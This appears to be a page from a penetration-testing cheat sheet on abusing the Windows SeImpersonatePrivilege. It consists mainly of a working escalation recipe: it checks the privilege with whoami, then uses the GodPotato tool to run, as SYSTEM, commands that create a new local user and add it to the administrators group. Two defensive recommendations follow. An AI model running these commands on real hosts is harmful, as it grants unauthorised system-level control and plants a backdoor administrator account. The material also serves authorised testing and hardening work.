---
layout: default
title: SeImpersonatePrivilege Abuse
parent: Windows
nav_order: 11
permalink: /windows/seimpersonateprivilege/
---

# SeImpersonatePrivilege Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Exploit

Using [GodPotato](https://github.com/BeichenDream/GodPotato).

```bash
# Check if SeImpersonatePrivilege is enabled for the current user.
whoami /priv

# Execute command as NT AUTHORITY/SYSTEM.
.\GodPotato.exe -cmd "net user $username $password /add; net localgroup administrators $username /add"
```

## Recommendations

- [ ] Disable SeImpersonatePrivilege on domain and local users.
- [ ] Enforce EDR on Windows hosts to detect and block GodPotato-like exploits.